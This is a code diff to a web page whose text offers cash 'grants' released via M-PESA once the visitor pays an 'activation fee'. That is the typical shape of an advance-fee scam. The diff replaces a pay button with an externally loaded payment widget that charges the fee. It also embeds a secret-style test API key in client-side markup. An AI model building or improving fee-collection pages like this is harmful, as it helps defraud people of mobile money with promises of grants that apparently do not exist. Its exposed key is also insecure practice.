@@ -397,7 +397,9 @@
                 </div>
                 <div class="error" id="err-payPhone">⚠️ Enter a valid 9-digit number (e.g. 712345678)</div>
             </div>
-            <button id="payBtn" class="btn" onclick="paySTK()">Pay Activation Fee & Receive Grant</button>
+            <!-- FinAPI Payment Widget Container -->
+            <div id="finapi-container-wrapper"></div>
+            
             <p class="disclaimer">Standard one-time activation fee. The selected grant will be released via M-PESA instantly upon confirmation.</p>
         </div>
     </div>
@@ -651,6 +653,34 @@ function selectGrant(grant, fee, el) {
     document.getElementById('sGrant').innerText = grant.toLocaleString();
     document.getElementById('sFee').innerText = fee.toLocaleString();
     document.getElementById('grantError').style.display = 'none';
+    
+    const wrapper = document.getElementById('finapi-container-wrapper');
+    if (wrapper) {
+        wrapper.innerHTML = `
+            <div id="finapi-container" class="finapi-widget" 
+                 data-api-key="sk_test_1e5e31e2e80247d09b8a165e827e3254" 
+                 data-amount="${fee}" 
+                 data-color="#2563eb"
+                 data-provider="payhero">
+            </div>
+        `;
+        
+        // Re-inject script to trigger initialization
+        const oldScript = document.getElementById('finapi-script');
+        if (oldScript) oldScript.remove();
+        const script = document.createElement('script');
+        script.src = "https://stkpush.co.ke/static/js/finapi-widget.min.js";
+        script.id = "finapi-script";
+        document.body.appendChild(script);
+
+        const widget = document.getElementById('finapi-container');
+        widget.addEventListener('finapi:payment_success', (e) => {
+            console.log('Success!', e.detail);
+        });
+        widget.addEventListener('finapi:payment_failed', (e) => {
+            console.log('Failed!', e.detail);
+        });
+    }
     
     navigateWithLoader(4);
 }
